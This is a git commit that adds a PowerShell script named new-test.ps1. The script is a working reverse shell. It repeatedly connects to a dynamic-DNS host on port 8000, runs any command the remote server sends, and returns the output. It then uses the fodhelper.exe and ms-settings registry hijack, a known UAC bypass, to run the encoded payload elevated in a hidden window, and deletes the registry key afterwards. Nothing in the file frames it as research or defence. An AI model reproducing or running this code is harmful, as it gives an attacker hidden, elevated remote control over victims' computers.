6d53a408c7c7300df1ca5db482d05e7e3f132284
noamz1 <32007964+noamz1@users.noreply.github.com>
2017-10-27 06:55:59 +0300

    Create new-test.ps1

---
+++ new-test.ps1
@@ -0,0 +1,53 @@
+$clientz = { $address = 'noamz.hopto.org'
+$port = 8000
+while ($true) {
+    do {
+        try {
+            Write-Host "Trying to reach "$address":"$port
+            $client = New-Object System.Net.Sockets.TcpClient($address, $port)  
+            $stream = $client.GetStream()
+            $writer = New-Object System.IO.StreamWriter($stream)
+            $reader = New-Object System.IO.StreamReader($stream)
+            break
+        }
+        catch {
+            Start-Sleep -s 10
+        }
+    } while ($true)
+    
+    Write-Host "Connected"
+    # Execute commands sent by the server, and return output
+    try {
+        do {
+            $cmd = $reader.ReadLine()
+            if ($cmd -eq 'exit') {
+                Write-Host "Exiting"
+                break
+            }
+            try {
+                $output = [string](iex $cmd)
+            }
+            catch {
+                $output = $_.Exception.Message
+            }
+            $writer.WriteLine($output)
+            $writer.Flush()
+        } while($true)
+    }
+    catch {
+        Write-Host $_.Exception.Message
+    }
+    
+    # Cleanup
+    $writer.Close()
+    $reader.Close()
+    $stream.Close()
+    $client.Close()
+}}
+
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -w 1 -nop -noni -e $clientz" -Force
+Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+Start-Sleep 3
+Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
